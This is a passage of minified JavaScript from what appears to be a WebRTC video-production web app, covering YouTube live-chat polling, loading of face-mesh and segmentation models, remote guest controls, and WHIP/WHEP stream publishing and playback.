onclick='(function(){tokenClient.requestAccessToken({prompt: \"consent\"});})()'>Grant Access to Youtube Chat</button>",!1,!1):remote?tokenClient.requestAccessToken({prompt:""}):warnUser("<button onclick='(function(){this.remove();tokenClient.requestAccessToken({prompt: \"\"});})()'>Grant Access to Youtube Chat</button>",!1,!1)}()}async function initializeGapiClient(){await gapi.client.init({apiKey:session.youtubeKey.split(",")[1],discoveryDocs:["https://www.googleapis.com/discovery/v1/apis/youtube/v3/rest"]}),gapiInited=!0,maybeEnableButtons()}async function listBroadcasts(){try{var response=await gapi.client.youtube.liveBroadcasts.list({broadcastStatus:"active"})}catch(err){return void errorlog(err)}let broadcasts=response.result.items;broadcasts&&0!=broadcasts.length&&broadcasts.forEach((broadcast=>{setTimeout((function(liveChatId){listMessages(liveChatId),busy+=1}),1e3,broadcast.snippet.liveChatId)}))}async function listMessages(liveChatId,pageToken=!1){try{if(pageToken)var response=await gapi.client.youtube.liveChatMessages.list({liveChatId:liveChatId,part:["id","snippet","authorDetails"],pageToken:pageToken});else response=await gapi.client.youtube.liveChatMessages.list({liveChatId:liveChatId,part:["id","snippet","authorDetails"]});response.result.items.forEach((msg=>{pokeIframeAPI("YoutubeChat",msg)}));var polling=response.result.pollingIntervalMillis;pageToken=response.result.nextPageToken;busy>1||(busy>0?polling<2e3&&(polling=2e3):polling<5e3&&(polling=5e3)),busy=0,setTimeout((function(liveChatId,pageToken){listMessages(liveChatId,pageToken)}),polling,liveChatId,pageToken)}catch(err){return}}}function loadTensorflowJS(){if(null==session.TFJSModel){log("loadTensorflowJS()"),session.TFJSModel=!0;var script=document.createElement("script"),script2=document.createElement("script"),script3=document.createElement("script"),script4=document.createElement("script");script.onload=function(){document.head.appendChild(script2)},script2.onload=function(){document.head.appendChild(script3)},script3.onload=function(){document.head.appendChild(script4)},script4.onload=function(){!async function loadModel(){session.TFJSModel=await faceLandmarksDetection.load(faceLandmarksDetection.SupportedPackages.mediapipeFacemesh),closeModal(),warnUser("Almost done loading model...",3e3)}()},script.src="./thirdparty/tfjs/tf-core.js",script2.src="./thirdparty/tfjs/tf-converter.js",script3.src="./thirdparty/tfjs/tf-backend-webgl.js",script4.src="./thirdparty/tfjs/face-landmarks-detection.js",warnUser("Downloading a big effects model... may take a minute",15e3),script.type="text/javascript",script2.type="text/javascript",script3.type="text/javascript",script4.type="text/javascript",document.head.appendChild(script)}}var TFLITELOADING=!1;function attemptTFLiteJsFileLoad(){if(!1!==session.tfliteModule)return!0;if(warnUser("Loading effects model..."),TFLITELOADING=!0,session.tfliteModule={},!document.getElementById("tflitesimdjs")){var tmpScript=document.createElement("script");tmpScript.onload=loadTFLiteModel,tmpScript.type="text/javascript",tmpScript.src="./thirdparty/tflite/tflite-simd.js?ver=2",tmpScript.id="tflitesimdjs",document.head.appendChild(tmpScript)}return!1}async function changeTFLiteImage(ev,ele){ele.files&&ele.files[0]?(session.tfliteModule.img&&session.tfliteModule.img.classList.remove("selectedTFImage"),session.tfliteModule.img=document.createElement("img"),session.tfliteModule.img.style="max-width:130px;max-height:73.5px;display:inline-block;margin:10px;cursor:pointer;",session.tfliteModule.img.onclick=function(event){changeTFLiteImage(event,this)},ele.parentNode.parentNode.insertBefore(session.tfliteModule.img,ele.parentNode),session.tfliteModule.img.onload=()=>{URL.revokeObjectURL(session.tfliteModule.img.src)},session.tfliteModule.img.src=URL.createObjectURL(ele.files[0]),session.tfliteModule.img.classList.add("selectedTFImage")):"img"==ele.tagName.toLowerCase()&&(session.tfliteModule.img.classList.remove("selectedTFImage"),session.tfliteModule.img=ele,session.tfliteModule.img.classList.add("selectedTFImage"))}async function changeEffectAmount(ev,ele){session.effectValue=ele.value,"selectEffectAmountInput"===ele.id&&(getById("selectEffectAmountInput3").value=ele.value),log("session.effectValue: "+session.effectValue)}async function loadTFLiteModel(){try{if(session.tfliteModule&&session.tfliteModule.img){var img=session.tfliteModule.img;session.tfliteModule=await createTFLiteSIMDModule(),session.tfliteModule.img=img}else session.tfliteModule={},session.tfliteModule=await createTFLiteSIMDModule();if(!session.tfliteModule.simd){var elements=document.querySelectorAll("[data-warnSimdNotice]");for(let i=0;i<elements.length;i++)elements[i].style.display="inline-block"}}catch(e){return warnlog("TF-LITE FAILED TO LOAD"),void closeModal()}const modelResponse=await fetch("./thirdparty/tflite/segm_full_v679.tflite");session.tfliteModule.model=await modelResponse.arrayBuffer(),session.tfliteModule.HEAPU8.set(new Uint8Array(session.tfliteModule.model),session.tfliteModule._getModelBufferMemoryOffset()),session.tfliteModule._loadModel(session.tfliteModule.model.byteLength),session.tfliteModule.activelyProcessing=!1,TFLITELOADING=!1,closeModal(),LaunchTFWorkerCallback&&TFLiteWorker()}function smdInfo(){warnUser("For improved performance, use Chrome v87 or newer with SIMD support enabled.<br />Enable SIMD here: <a href='chrome://flags/#enable-webassembly-simd' onclick='copyFunction(this,event)' target='_blank'>chrome://flags/#enable-webassembly-simd</a>",!1,!1)}function getGuestTarget(type,id){var element=document.querySelectorAll('[data-action-type="'+type+'"][data-sid="'+id+'"]');return element.length?element=element[0]:getRightOrderedElement('[data-action-type="'+type+'"][data--u-u-i-d]',id)}function getGuestTargetScene(scene,id){var element=document.querySelectorAll('[data-action-type="addToScene"][data-scene="'+scene+'"][data-sid="'+id+'"]');return element.length?element=element[0]:getRightOrderedElement('[data-action-type="addToScene"][data-scene="'+scene+'"][data--u-u-i-d]',id)}function getGuestTargetGroup(group,id){var element=document.querySelectorAll('[data-action-type="toggle-group"][data-group="'+group+'"][data-sid="'+id+'"]');return element.length?element=element[0]:getRightOrderedElement('[data-action-type="toggle-group"][data-group="'+group+'"][data--u-u-i-d]',id)}function targetGuest(target,action,value=null){if(target?target==parseInt(target)+""&&target<100&&(target-=1):target=1,warnlog("target "+target),warnlog("action "+action),warnlog("value "+value),0==action||"forward"==action)(element=getGuestTarget("forward",target))&&directMigrate(element,!0,value);else if(1==action||"addScene"==action){var scene=1;if("null"==value||null==value||"toggle"==value?scene=1:!0!==value&&!1!==value&&(scene=value),element=getGuestTargetScene(scene,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(2==action||"muteScene"==action){if(element=getGuestTarget("mute-scene",target))return!0===value?element.value=1:!1===value&&(element.value=0),directMute(element,!0)}else if(3==action||"mic"==action){if(element=getGuestTarget("mute-guest",target))return!0===value?element.value=1:!1===value&&(element.value=0),remoteMute(element,!0)}else if(4==action||"hangup"==action){if(element=getGuestTarget("hangup",target))return directHangup(element,!0)}else if(5==action||"soloChat"==action||"soloTalk"==action){if(element=getGuestTarget("solo-chat",target))return!0===value?element.value=1:!1===value&&(element.value=0),session.toggleSoloChat(element.dataset.UUID)}else if(6==action||"speaker"==action){if(element=getGuestTarget("toggle-remote-speaker",target))return!0===value?element.value=1:!1===value&&(element.value=0),remoteSpeakerMute(element)}else if(7==action||"display"==action){if(element=getGuestTarget("toggle-remote-display",target))return!0===value?element.value=1:!1===value&&(element.value=0),remoteDisplayMute(element)}else if(8==action||"group"==action){if("null"!=value&&null!=value||(value=1),element=getGuestTargetGroup(value,target))return changeGroup(element,null,value)}else if(9==action||"soloChatBidirectional"==action||"soloTalkBidirectional"==action){if(element=getGuestTarget("solo-chat",target)){var ctrl={ctrlKey:!0};return!0===value?element.value=1:!1===value&&(element.value=0),session.toggleSoloChat(element.dataset.UUID,ctrl)}}else if(10==action||"video"==action){if(element=getGuestTarget("mute-video-guest",target))return!0===value?element.value=1:!1===value&&(element.value=0),remoteMuteVideo(element,!0)}else if(12==action||"addScene2"==action){if(element=getGuestTargetScene(2,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(13==action||"addScene3"==action){if(element=getGuestTargetScene(3,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(14==action||"addScene4"==action){if(element=getGuestTargetScene(4,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(15==action||"addScene5"==action){if(element=getGuestTargetScene(5,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(16==action||"addScene6"==action){if(element=getGuestTargetScene(6,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(17==action||"addScene7"==action){if(element=getGuestTargetScene(7,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(18==action||"addScene8"==action){if(element=getGuestTargetScene(8,target))return!0===value?element.value=1:!1===value&&(element.value=0),directEnable(element,!0)}else if(19==action||"forceKeyframe"==action){if(element=getGuestTarget("force-keyframe",target))return requestKeyframeScene(element)}else if(20==action||"soloVideo"==action){if(element=getGuestTarget("solo-video",target))return!0===value?element.value=1:!1===value&&(element.value=0),requestInfocus(element)}else if(21==action||"sendChat"==action){if(element=getGuestTarget("solo-video",target))return sendChat(value,element.dataset.UUID)}else if(22==action||"sendDirectorChat"==action){if(element=getGuestTarget("solo-video",target))return sendChat(value,element.dataset.UUID,!0)}else if(27==action||"volume"==action){if(element=getGuestTarget("volume",target))return element.value=parseInt(value)||0,remoteVolume(element)}else if("startRoomTimer"==action){if(element=getGuestTarget("create-timer",target))return element.value=0,directTimer(element,!1,value)}else if("pauseRoomTimer"==action){if(element=getGuestTarget("create-timer",target))return element.value,directTimer(element,{ctrlKey:!0})}else if("stopRoomTimer"==action){var element;if(element=getGuestTarget("create-timer",target))return element.value=1,directTimer(element)}return!1}async function startPublishing(){("true"==query("#publishOutURL input[type='text']").dataset.twitch?session.whipOutput="https://g.webrtc.live-video.net:4443/v2/offer":session.whipOutput=query("#publishOutURL input[type='text']").value||session.whipOutput||null,session.whipOutput)?(session.whipOutputToken||(session.whipOutputToken=query("#publishOutToken input[type='password']").value||!1),session.whipOutputToken||"true"!=query("#publishOutURL input[type='text']").dataset.twitch?(getById("publishSettings").classList.add("hidden"),getById("whipoutvbrcbr").classList.contains("hidden")||("cbr"===getById("whipoutvbrcbr").value?session.cbr=1:session.cbr=0),getById("whipoutdenoise").classList.contains("hidden")||("1"===getById("whipoutdenoise").value?session.noiseSuppression=!0:session.noiseSuppression=!1),getById("whipoutautogain").classList.contains("hidden")||("1"===getById("whipoutautogain").value?session.autoGainControl=!0:session.autoGainControl=!1),getById("whipoutstereo").classList.contains("hidden")||("1"===getById("whipoutstereo").value?session.stereo=1:session.stereo=0),getById("whipoutbitrateGroupFlag").classList.contains("hidden")||(session.whipOutVideoBitrate=parseInt(getById("whipoutbitrateGroupFlag").value)),getById("whipoutaudiobitrate").classList.contains("hidden")||(session.whipOutAudioBitrate=parseInt(getById("whipoutaudiobitrate").value)),await publishScreen()?(getById("publishSettings").classList.add("hidden"),resizeWindow(1280,720),document.title="PUBLISHINGğŸ”´"+document.title):getById("publishSettings").classList.remove("hidden")):warnUser("Please enter a Twitch stream token first",2e3)):warnUser("Please first provided an output destination",2500)}function twitchSelect(ele){ele.checked?(query("#publishOutURL input[type='text']").disabled=!0,query("#publishOutURL input[type='text']").classList.add("disable"),query("#publishOutURL input[type='text']").dataset.twitch="true",query("#publishOutToken input[type='password']").placeholder="Twitch stream token here"):(query("#publishOutURL input[type='text']").disabled=null,query("#publishOutURL input[type='text']").classList.remove("disable"),delete getById("publishOutURL").disabled,query("#publishOutURL input[type='text']").dataset.twitch="false",query("#publishOutToken input[type='password']").placeholder="WHIP auth token here")}function resizeWindow(width,height){window.outerWidth?window.resizeTo(width+(window.outerWidth-window.innerWidth),height+(window.outerHeight-window.innerHeight)):(window.resizeTo(500,500),window.resizeTo(width+(500-document.body.offsetWidth),height+(500-document.body.offsetHeight))),setInterval((function(){window.innerWidth/window.innerHeight>17/9&&window.innerWidth/window.innerHeight<15/9||(window.outerWidth?window.resizeTo(width+(window.outerWidth-window.innerWidth),height+(window.outerHeight-window.innerHeight)):(window.resizeTo(500,500),window.resizeTo(width+(500-document.body.offsetWidth),height+(500-document.body.offsetHeight))))}),5e3)}function configureWhipOutSDP(description){var configs=!1;SafariVersion&&SafariVersion<=13&&(iOS||iPad)||(3==session.stereo||5==session.stereo||6==session.stereo||1==session.stereo?(configs={stereo:1,useinbandfec:session.noFEC?0:1,maxptime:session.maxptime,minptime:session.minptime,ptime:session.ptime,dtx:session.dtx},log("stereo enabled")):iOS||iPad?configs={useinbandfec:session.noFEC?0:1,maxptime:session.maxptime,minptime:session.minptime,ptime:session.ptime,dtx:session.dtx}:4==session.stereo?(configs={stereo:2,useinbandfec:session.noFEC?0:1,maxptime:session.maxptime,minptime:session.minptime,ptime:session.ptime,dtx:session.dtx},log("stereo enabled")):configs={stereo:0,useinbandfec:session.noFEC?0:1,maxptime:session.maxptime,minptime:session.minptime,ptime:session.ptime,dtx:session.dtx}),session.whipOutAudioBitrate&&(configs?(configs.maxaveragebitrate=1024*session.whipOutAudioBitrate,configs.cbr=session.cbr):configs={maxaveragebitrate:1024*session.whipOutAudioBitrate,cbr:session.cbr}),configs&&(log("Processing sdp of type: "+description.type+" ..."),description.sdp=CodecsHandler.setOpusAttributes(description.sdp,configs,!0)),(iOS||iPad)&&session.removeOrientationFlag&&description.sdp.includes("a=extmap:3 urn:3gpp:video-orientation\r\n")&&(description.sdp=description.sdp.replace("a=extmap:3 urn:3gpp:video-orientation\r\n","")),session.screenShareState&&"object"==typeof session.whipOutScreenShareCodec?session.whipOutScreenShareCodec.reverse().forEach((codec=>{description.sdp=CodecsHandler.preferCodec(description.sdp,codec,session.videoErrorCorrection),(session.whipOutScreenShareBitrate||session.whipOutVideoBitrate)&&(description.sdp=CodecsHandler.setVideoBitrates(description.sdp,{min:parseInt((session.whipOutScreenShareBitrate||session.whipOutVideoBitrate)/10)||1,max:session.whipOutScreenShareBitrate||session.whipOutVideoBitrate||1},codec))})):session.screenShareState&&session.whipOutScreenShareCodec?(description.sdp=CodecsHandler.preferCodec(description.sdp,session.whipOutScreenShareCodec,session.videoErrorCorrection),(session.whipOutScreenShareBitrate||session.whipOutVideoBitrate)&&(description.sdp=CodecsHandler.setVideoBitrates(description.sdp,{min:parseInt((session.whipOutScreenShareBitrate||session.whipOutVideoBitrate)/10)||1,max:session.whipOutScreenShareBitrate||session.whipOutVideoBitrate||1},session.whipOutScreenShareCodec))):"object"==typeof session.whipOutCodec?session.whipOutCodec.reverse().forEach((codec=>{description.sdp=CodecsHandler.preferCodec(description.sdp,codec,session.videoErrorCorrection),session.whipOutVideoBitrate&&(description.sdp=CodecsHandler.setVideoBitrates(description.sdp,{min:parseInt(session.whipOutVideoBitrate/10)||1,max:session.whipOutVideoBitrate||1},codec))})):session.whipOutCodec?(description.sdp=CodecsHandler.preferCodec(description.sdp,session.whipOutCodec,session.videoErrorCorrection),session.whipOutVideoBitrate&&(description.sdp=CodecsHandler.setVideoBitrates(description.sdp,{min:parseInt(session.whipOutVideoBitrate/10)||1,max:session.whipOutVideoBitrate||1},session.whipOutCodec))):(iOS||iPad?(jsep.sdp=jsep.sdp.replace(/42e01f/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/42001f/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/420029/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/42a01e/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/42a014/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/42a00b/gi,"42e01f"),jsep.sdp=jsep.sdp.replace(/640c1f/gi,"42e01f")):(description.sdp=CodecsHandler.preferCodec(description.sdp,"h264",session.videoErrorCorrection),description.sdp=description.sdp.replace(/42001f/gi,"42e01f"),description.sdp=description.sdp.replace(/420029/gi,"42e01f")),session.whipOutVideoBitrate&&(description.sdp=CodecsHandler.setVideoBitrates(description.sdp,{min:parseInt(session.whipOutVideoBitrate/10)||1,max:session.whipOutVideoBitrate||1},"h264")));var bitrate=2500;return!1!==session.whipOutVideoBitrate&&(bitrate=session.whipOutVideoBitrate),session.screenShareState&&!1!==session.whipOutScreenShareBitrate&&(bitrate=session.whipOutScreenShareBitrate),session.whipOut.savedBitrate=bitrate,session.whipOut.setBitrate=bitrate,description}const scalabilityModes=["L1T1","L1T2","L1T3","L2T1","L2T2","L2T3","L3T1","L3T2","L3T3","L2T1h","L2T2h","L2T3h","S2T1","S2T2","S2T3","S2T1h","S2T2h","S2T3h","S3T1","S3T2","S3T3","S3T1h","S3T2h","S3T3h","L2T2_KEY","L2T3_KEY","L3T2_KEY","L3T3_KEY"];function whipOut(){log("whipOut");var candidates=[],keyframe=!1;var publishing=!1;function publish(event){if(publishing)return log(event),void errorlog("onnegotiationneeded again?");publishing=!0,warnlog("ON NEGO NEEDED"),warnlog(event);try{session.whipOut.createOffer().then((function(description){try{description=configureWhipOutSDP(description)}catch(e){errorlog(e)}return session.whipOut.setLocalDescription(description)})).then((function(){var sdp=session.whipOut.localDescription.sdp;sdp.includes("sendrecv")&&(errorlog("Should not include sendrecv"),sdp=(sdp=sdp.replace("a=sendrecv","a=sendonly")).replace("v=sendrecv","v=sendonly")),function ajax(data,type,callback=!1){log("AJAX: "+type);try{var xhttp=new XMLHttpRequest;xhttp.onreadystatechange=function(){if(4==this.readyState&&(200==this.status||201==this.status)){var contentType=this.getResponseHeader("content-type");contentType.startsWith("text/plain")&&warnlog("The WHIP output destination responded with an incorrect content type; will attempt to continue still."),session.whipOut.stats||(session.whipOut.stats={}),session.whipOut.stats.whipHost="generic",session.whipOut.stats.whep_URL=!1,session.whipOut.stats.watch_URL=!1;var WHELPlaybackURL=!1;try{if(log(this.getAllResponseHeaders()),this.getAllResponseHeaders().indexOf("whep")>=0&&(WHELPlaybackURL=this.getResponseHeader("whep")||!1),!WHELPlaybackURL&&session.whipOutput){var targetDomain=session.whipOutput.split("/");targetDomain[2].endsWith(".cloudflarestream.com")&&65==targetDomain[3].length&&(WHELPlaybackURL="https://"+targetDomain[2]+"/"+targetDomain[3].slice(33,65)+"/webRTC/play",session.whipOut.stats.whipHost="Cloudflare")}log("WHELPlaybackURL: "+WHELPlaybackURL),session.whipOut.stats.whep_URL=WHELPlaybackURL}catch(e){errorlog(e)}if(WHELPlaybackURL&&(session.whipoutSettings={type:"whep",url:WHELPlaybackURL}),contentType.startsWith("application/sdp")||contentType.startsWith("text/plain")){var jsep={};jsep.sdp=this.responseText,jsep.type="answer";try{jsep=configureWhipOutSDP(jsep)}catch(e){errorlog(e)}warnlog("Processing answer:"),warnlog(jsep),session.whipOut.setRemoteDescription(jsep).then((async function(){warnlog("SHOULD BE CONNECTED?");for(var content="";candidates.length;){content+=candidates.pop().candidate}if(warnlog("Content: "+content.length),keyframe||(keyframe=setInterval((function(){!function GOP(){log("Sending keyframe");try{if(!session.whipOut)return;var senders=session.whipOut.getSenders(),sender=!1;if(senders.forEach((senderVideo=>{senderVideo.track&&senderVideo.track.id&&"video"==senderVideo.track.kind&&(sender=senderVideo)})),!sender)return log("GOP(): can't change bitrate; no video sender found"),!1;var settings={scaleResolutionDownBy:10};return setEncodings(sender,settings,(function(sendr){var settings={},chromeVersion=getChromiumVersion();settings.scaleResolutionDownBy=chromeVersion>80?null:1,setEncodings(sendr,settings,(function(){}))}),sender),!0}catch(e){errorlog(e)}}()}),6e3)),session.whipOutSetScale(),await sleep(1e3),session.whipoutSettings)for(var UUID in session.pcs)if(null===session.pcs[UUID].whipout){var data={};data.whepSettings=session.whipoutSettings,session.sendMessage(data,UUID)&&(session.pcs[UUID].whipout=!0)}})).catch((function(e){log(e)}))}else"application/error"==contentType?432==this.responseText?warnUser("Whip out error: 432"):warnUser("Unknown Whipe Out error"):callback&&callback()}},"trickle-ice-sdpfrag"===type?xhttp.open("PATCH",session.whipOutput,!0):xhttp.open("POST",session.whipOutput,!0),session.whipOutputToken&&xhttp.setRequestHeader("Authorization","Bearer "+session.whipOutputToken),xhttp.setRequestHeader("Content-Type","application/"+type),xhttp.onerror=function(e){errorlog(e),warnUser("Whip out failed.")},xhttp.send(data)}catch(e){errorlog(e)}}(sdp,"sdp")})).catch((function(err){}))}catch(e){errorlog(e)}}!async function whipConnect(){try{session.configuration||await chooseBestTURN(),session.encodedInsertableStreams&&(session.configuration.encodedInsertableStreams=!0);var config={...session.configuration};session.whipOut=new RTCPeerConnection(config),session.whipOut.stats={},session.whipOut.maxBandwidth=null,session.whipOut.scale=!1,session.whipOut.offerToReceiveAudio=!1,session.whipOut.offerToReceiveVideo=!1}catch(err){errorlog(err),session.cleanOutput||warnUser("An RTC error occured")}try{var tracks=!1;session.videoElement&&session.videoElement.srcObject&&(tracks=session.videoElement.srcObject.getAudioTracks());var streamsource=!1;if(tracks&&tracks.length)tracks=tracks[0],streamsource=session.videoElement.srcObject;else{var audioCtx=new AudioContext;warnlog("No audio track; using a webaudio node instead");var destination=audioCtx.createMediaStreamDestination();streamsource=destination.stream,destination.stream.getAudioTracks().forEach((trk=>{tracks=trk}))}if(session.audioContentHint&&"audio"===tracks.kind)try{tracks.contentHint=session.audioContentHint}catch(e){errorlog(e)}if(tracks)try{session.whipOut.addTransceiver(tracks,{streams:[streamsource],direction:"sendonly"})}catch(e){errorlog(e),session.whipOut.addTrack(tracks)}}catch(e){errorlog(e)}try{tracks=!1;if(session.videoElement&&session.videoElement.srcObject&&(tracks=session.videoElement.srcObject.getVideoTracks()),tracks&&tracks.length){if(tracks=tracks[0],session.screenShareState&&session.screenshareContentHint&&"video"===tracks.kind)try{tracks.contentHint=session.screenshareContentHint}catch(e){errorlog(e)}else if(session.contentHint&&"video"===tracks.kind)try{tracks.contentHint=session.contentHint}catch(e){errorlog(e)}try{var transceiverSetup={streams:[session.videoElement.srcObject],direction:"sendonly"};if(session.scalabilityMode){try{transceiverSetup.sendEncodings=[{scalabilityMode:session.scalabilityMode}]}catch(e){errorlog("Invalid scalability mode provided")}if(session.whipOutCodec&&session.whipOutCodec.length){var transceiver=!1;try{transceiver=session.whipOut.addTransceiver(tracks,transceiverSetup)}catch(e){if(errorlog(e),transceiver)warnUser("Could not configure WHIP output with specific codec settings.",5e3);else{warnUser("Could not configure WHIP output with SVC settings.",5e3);transceiverSetup={streams:[session.videoElement.srcObject],direction:"sendonly"};session.whipOut.addTransceiver(tracks,transceiverSetup)}}}else session.whipOut.addTransceiver(tracks,transceiverSetup)}else session.whipOut.addTransceiver(tracks,transceiverSetup)}catch(e){errorlog(e);try{session.whipOut.addTrack(tracks)}catch(e){errorlog(e)}}}if(session.encodedInsertableStreams){const senders=session.whipOut.getSenders();for(const sender of senders)try{setupSenderTransform(sender)}catch(e){errorlog(e)}}session.whipOut.onnegotiationneeded=publish,session.whipOut.onicecandidate=function(event){null!=event.candidate?candidates.push(event.candidate):log("END OF ICE CANDIDATES")}}catch(e){errorlog(e)}}()}function whipClient(){if(session.whipView){warnlog("WHIP Client started");var socket=null,connecting=!1,failedCount=0;!function connect(){if(clearTimeout(connecting),socket){if(socket.readyState===socket.OPEN)return;try{socket.close()}catch(e){}}log("Trying to load whip websocket..."),(socket=new WebSocket(session.whipServerURL)).onclose=function(){failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*(failedCount-1))},socket.onerror=function(e){console.error(e),failedCount+=1,clearTimeout(connecting),connecting=setTimeout((function(){connect()}),100*failedCount)},socket.onopen=function(){failedCount=0;try{socket.send(JSON.stringify({join:session.whipView}))}catch(e){connecting=setTimeout((function(){connect()}),1)}},socket.addEventListener("message",(async function(event){if(event.data){var data=JSON.parse(event.data);if("sdp"in data){var resp=await processWhipIn(data);if(resp){var ret={},get=data.get;data={},get&&(data.get=get,data.result=resp,ret.callback=data,socket.send(JSON.stringify(ret)))}}else if("delete"==data.type){warnlog("WHIP publisher is actively disconnecting");ret={},get=data.get;data={},get&&(data.get=get,data.result="OK",ret.callback=data,socket.send(JSON.stringify(ret)))}}}))}()}}async function processWhipIn(data){var msg={description:{}};msg.description.type="offer",msg.description.sdp=data.sdp;var UUID=session.generateRandomString(25);msg.UUID=UUID,data.streamID?msg.streamID=data.streamID:msg.streamID=session.generateRandomString(15),log("setupIncoming"),await session.setupIncoming(msg),session.rpcs[UUID].whip=!0;var callback=null,promise=new Promise(((resolve,reject)=>{callback=resolve}));session.rpcs[UUID].whipCallback=callback;var callback2=null,promise2=new Promise(((resolve,reject)=>{callback2=resolve}));session.rpcs[UUID].whipCallback2=callback2,log("CONNECT PEEER"),session.connectPeer(msg),log("CONNECT PEEER DONE"),session.manual&&session.director||(window.onresize=updateMixer,window.onorientationchange=function(){setTimeout(updateMixer,200)}),!1!==session.roomid||session.permaid||getById("header").classList.add("hidden"),log("ICE BUNDLE PROMISE"),setTimeout((function(UUID){session.rpcs[UUID].whipCallback2&&(session.rpcs[UUID].whipCallback2([...session.rpcs[UUID].iceBundle]),clearTimeout(session.rpcs[UUID].iceTimer),session.rpcs[UUID].iceTimer=null,session.rpcs[UUID].iceBundle=[],session.rpcs[UUID].whipCallback2=null)}),session.whepWait,UUID);var iceBundle=await promise2;return clearTimeout(session.rpcs[UUID].iceTimer),session.rpcs[UUID].iceTimer=null,session.rpcs[UUID].whipCallback2=null,log("ICE BUNDLE DONE"),log(iceBundle),await promise,session.rpcs[UUID].whipCallback=null,sdpAnswer=session.rpcs[UUID].localDescription.sdp,log("completed"),sdpAnswer}function processSDPFromServer(sdp){try{session.mono&&Firefox?sdp=CodecsHandler.setOpusAttributes(sdp,{stereo:0},!0):Firefox||(session.stereo&&4==session.stereo?sdp=CodecsHandler.setOpusAttributes(sdp,{stereo:2},!0):session.stereo&&!session.mono&&3!=session.stereo&&(sdp=CodecsHandler.setOpusAttributes(sdp,{stereo:1},!0)))}catch(e){errorlog(e)}return sdp}async function whepIn(whepInput=!1,whepInputToken=!1,UUID=!1){var candidates=[],responseLocation=!1,acceptPatch=!1,eTag=!1,icePwd=!1,iceUfrag=!1;if(UUID||(UUID="whep_"+session.generateRandomString(25)),whepInput=whepInput||session.whepInput){whepInputToken=whepInputToken||session.whepInputToken;var requestingStream=!1;return async function whepConnect(){try{UUID in session.rpcs||(session.rpcs[UUID]={},session.rpcs[UUID].stats={},session.rpcs[UUID].allowGraphs=!1,session.rpcs[UUID].inboundAudioPipeline={},session.rpcs[UUID].channelOffset=!1,session.rpcs[UUID].channelWidth=!1,session.rpcs[UUID].settings=!1,session.rpcs[UUID].lockedVideoBitrate=!1,session.rpcs[UUID].lockedAudioBitrate=!1,session.rpcs[UUID].manualBandwidth=!1,session.rpcs[UUID].motionDetectionInterval=!1,session.rpcs[UUID].buffer=!1,session.rpcs[UUID].getStatsTimeout=null),session.configuration||await chooseBestTURN(),session.encodedInsertableStreams&&(session.configuration.encodedInsertableStreams=!0);var config={...session.configuration};try{session.rpcs[UUID].whep=new RTCPeerConnection(config)}catch(err){errorlog(err),session.cleanOutput||warnUser("An RTC error occured")}var video=!0,audio=!0;if(!1===session.novideo||session.novideo.includes(session.rpcs[UUID].streamID)?session.rpcs[UUID].settings&&!session.rpcs[UUID].settings.video&&(video=!1):video=!1,!1===session.noaudio||session.noaudio.includes(session.rpcs[UUID].streamID)?session.rpcs[UUID].settings&&!session.rpcs[UUID].settings.audio&&(audio=!1):audio=!1,!audio&&!video)return void errorlog("We will not request the whep source as no audio or video is requested");session.manual&&session.director||(window.onresize=updateMixer,window.onorientationchange=function(){setTimeout(updateMixer,200)});try{video&&session.rpcs[UUID].whep.addTransceiver("video",{direction:"recvonly"}),audio&&session.rpcs[UUID].whep.addTransceiver("audio",{direction:"recvonly"})}catch(e){errorlog(e)}session.rpcs[UUID].whep.ontrack=function(event){warnlog("TRACK INBOUND!"),warnlog(event),session.onTrack(event,UUID)}}catch(err){errorlog(err),session.cleanOutput||warnUser("An RTC error occured")}session.rpcs[UUID].whep.onnegotiationneeded=requestStream,session.rpcs[UUID].whep.onicecandidate=function(event){if(null==event.candidate)return warnlog("END OF ICE CANDIDATES"),void(session.rpcs[UUID].whep.iceCompletedCallback&&session.rpcs[UUID].whep.iceCompletedCallback());if(eTag&&icePwd&&iceUfrag&&acceptPatch&&"application/trickle-ice-sdpfrag"==acceptPatch&&event.candidate&&responseLocation&&!session.rpcs[UUID].whep.iceCompletedCallback){if(log("Send patch request with ice candidate"),event.candidate.candidate){ajax("a=ice-ufrag:"+iceUfrag+"\r\na=ice-pwd:"+icePwd+"\r\nm=audio RTP/AVP 0\r\na=mid:0\r\na="+event.candidate.candidate+"\r\na=end-of-candidates\r\n","trickle-ice-sdpfrag",!1,{"if-match":eTag})}}else candidates.push(event.candidate)},log("onnegotiationneeded event setup")}(),UUID}function requestStream(event){if(requestingStream)return log(event),void errorlog("onnegotiationneeded again?");requestingStream=!0,warnlog("ON NEGO NEEDED"),warnlog(event);try{session.rpcs[UUID].whep.createOffer().then((async function(offer){return offer.sdp=processSDPFromServer(offer.sdp),session.rpcs[UUID].whep.setLocalDescription(offer)})).then((async function(){try{if(session.whepWait){console.log("Waiting for ice candidates to collect. At least 300ms recommended; at most 30-seconds.");let startTime=Date.now();const{promise:promise,resolve:resolve}=sleepCancellable(session.whepWait);session.rpcs[UUID].whep.iceCompletedCallback=resolve,await promise,console.log("Finished waiting for ice candidates. Waited "+(Date.now()-startTime)/1e3+"-seconds"),delete session.rpcs[UUID].whep.iceCompletedCallback}}catch(e){errorlog(e)}var sdp=session.rpcs[UUID].whep.localDescription.sdp;(sdp=processSDPFromServer(sdp)).includes("sendrecv")&&(errorlog("Should not include sendrecv"),sdp=(sdp=sdp.replace("a=sendrecv","a=recvonly")).replace("v=sendrecv","v=recvonly")),ajax(sdp,"sdp")})).catch((function(err){}))}catch(e){errorlog(e)}}function ajax(dataPayload,type,callback=!1,headers=!1){try{var xhttp=new XMLHttpRequest;xhttp.onreadystatechange=function(){if(4!=this.readyState||200!=this.status&&201!=this.status)4==this.readyState&&204==this.status||(warnlog(this.status),432==this.status||405==this.status||501==this.status||this.status);else{let 